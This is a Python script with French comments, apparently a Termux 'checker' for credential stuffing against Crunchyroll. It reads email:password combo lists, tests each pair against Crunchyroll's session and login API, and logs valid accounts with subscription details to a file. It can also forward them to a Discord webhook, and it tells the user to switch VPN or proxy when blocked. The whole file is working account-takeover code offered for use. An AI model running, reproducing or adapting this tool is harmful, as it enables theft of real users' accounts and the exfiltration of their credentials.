import requests
import json
import sys
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore
from bs4 import BeautifulSoup

# Initialisation des couleurs
init(autoreset=True)
red = Fore.RED
blue = Fore.BLUE
white = Fore.WHITE

# --- CONFIGURATION ---
webhookurl = ""  # Mets ton lien ici si tu en as un
debug = False
iscapture = False

# Vérification du fichier combos
if not os.path.exists("combos.txt"):
    print(f"{red}[!] Fichier combos.txt introuvable dans le dossier.")
    sys.exit()

with open("combos.txt", 'r') as f:
    combos = f.read().splitlines()

def logo():
    # Logo simplifié pour éviter les erreurs de syntaxe
    print(f"{blue}=== CRUNCHYROLL CHECKER (TERMUX) ===")
    print(f"{white}Combos chargés: {len(combos)}")
    print(f"{white}Webhook: {'Configuré' if webhookurl else 'Aucun'}")
    print("="*35)

def crunchycheck():
    logo()
    for i, line_raw in enumerate(combos):
        try:
            # Parsing du combo
            if iscapture:
                line = line_raw.split(" ")[0].split(":")
            else:
                line = line_raw.split(":")
            
            if len(line) < 2:
                continue

            email = line[0]
            password = line[1]

            # Etape 1 : Start Session
            r = requests.post('https://api.crunchyroll.com/start_session.0.json', data={
                'version': '1.0', 
                'access_token': 'LNDJgOit5yaRIWN',
                'device_type': 'com.crunchyroll.windows.desktop', 
                'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 
                'account': email, 
                'password': password
            }, timeout=10)

            if "session_id" in r.text:
                coodata = r.json()["data"]["session_id"]
                
                # Etape 2 : Login
                rl = requests.post('https://api.crunchyroll.com/login.0.json', data={
                    'account': email, 
                    'password': password, 
                    'session_id': coodata
                }, timeout=10)

                info = rl.json()
                if info.get("code") == "ok":
                    data = info["data"]
                    userdata = data["user"]
                    expire = data["expires"]
                    name = userdata["username"]
                    subscription = userdata["access_type"]
                    
                    yes = f"[VALID] {email}:{password} | Sub: {subscription} | User: {name} | Exp: {expire}"
                    print(f"{Fore.GREEN}{yes}")
                    
                    # Sauvegarde locale
                    with open("valid.txt", "a") as write:
                        write.write(yes + "\n")
                    
                    # Envoi Webhook
                    if webhookurl:
                        webhook = DiscordWebhook(url=webhookurl, content=yes)
                        webhook.execute()
                else:
                    print(f"[{i}] {red}Invalide -> {email}")
            
            elif "banned" in r.text.lower() or "cloudflare" in r.text.lower():
                print(f"[{i}] {red}IP Bloquée par Cloudflare (Utilise un VPN ou Proxy)")
                # On s'arrête si on est banni pour ne pas spammer pour rien
                break

        except Exception as e:
            if debug:
                print(f"Erreur sur {line_raw}: {e}")
            continue

if __name__ == "__main__":
    crunchycheck()
